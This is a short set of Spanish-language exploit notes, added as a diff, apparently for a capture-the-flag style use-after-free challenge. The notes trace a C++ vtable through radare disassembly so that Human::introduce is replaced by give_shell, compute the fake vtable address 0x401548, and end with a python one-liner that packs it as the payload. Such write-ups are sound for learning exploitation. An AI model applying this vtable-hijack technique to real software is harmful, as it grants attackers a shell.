@@ -1,0 +1,51 @@
+
+no hay ASLR!
+
+quiero evitar la llamada a:
+0x00401192    1 125          sym.Human::introduce
+
+quiro llamar a:
+0x0040117a    1 24           sym.Human::give_shell
+
+tengo que alocar el tamaño justo para que el puntero de introduce sea sobreescrito por give_shell
+
+que tamaño es?
+que estructura tiene?
+volvio a andar radare?
+
+
+
+TAMAÑO: 10 bytes?
+sym.Human::Human
+
+add rax, 0x10
+mov rdi, rax
+call sym.std::basic_string_char_std::char_traits_char__std::allocator_char__::basic_string;[ga]
+
+
+------------------------------------------------
+
+mov rax, qword [local_38h]   (rax = 0x01c57ea0)
+mov rax, qword [rax]         (rax=  0x401570  )
+add rax, 8                   (rax=  0x401578  )
+mov rdx, qword [rax] 
+call rdx 0x004012d2  --> sym.Man::introduce
+
+
+a0ee b900 0000
+0xb9eea0
+
+
+RBX - 0x38 -> estructura extraña del humano -> funcion sym.Man::introduce
+
+
+necesito una direc de memoria estática que apunte a 0x0040117a
+le tengo que restar 8 y eso es lo que escribo
+
+
+0x00401550 
+menos 8
+
+la posta: 0x401548
+
+python -c "import struct;import sys; sys.stdout.write(struct.pack('Q', 0x401548))" >
